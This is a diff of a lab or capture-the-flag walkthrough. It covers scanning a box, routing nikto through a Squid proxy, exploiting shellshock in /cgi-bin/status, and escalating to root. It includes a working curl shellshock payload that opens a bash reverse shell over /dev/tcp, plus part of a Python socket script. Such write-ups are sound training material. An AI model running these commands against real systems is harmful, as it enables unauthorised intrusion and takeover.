@@ -1,3 +1,4 @@
+# Finding the Box
 ```
 nmap -sn 192.168.114.1-254
 ```
@@ -16,8 +17,7 @@ Nmap scan report for 192.168.114.131
 Host is up.
 Nmap done: 254 IP addresses (4 hosts up) scanned in 4.68 seconds
 ```
-
-
+# Port Enumeration
 ```
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-16 20:09 AEDT
 Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
@@ -35,7 +35,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds
 ```
-Low hanging fruit.
+#### HTTP Enumeration
 ```
 3128/tcp open   http-proxy Squid http proxy 3.1.19
 ```
@@ -48,8 +48,6 @@ Settings>Advanced>Connection>Manual Proxy Connection
 Using proxy ip 192.168.114.133 on port 3128
 We try to connect again and we made connected through.
 
-HTTP Enumeration
-
 Using NIKTO making sure to use it through a proxy
 ```
 nikto -h 192.168.114.133 -useproxy 192.168.114.133:3128
@@ -60,7 +58,7 @@ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulne
 Shellshock vulnerability is found, since it is a linux kernel it is incredibly easy to just pass through a reverse shell.
 
 
-Vulnerability - Shellshock
+# Exploiting Vulnerability - Shellshock
 
 Basic shellshock.
 ```
@@ -71,7 +69,7 @@ Using curl and modifying this to include a reverse shell. Making sure to connect
 curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.114.131/1234 0>&1" 192.168.114.133/cgi-bin/status --proxy 192.168.114.133:3128
 ```
 
-Limited Shell
+# Privilege Escalation
 
 Running a linux privilege checker script.
 
@@ -133,4 +131,10 @@ while 1:
 s.close()
 
 ```
+
 Root
+```
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
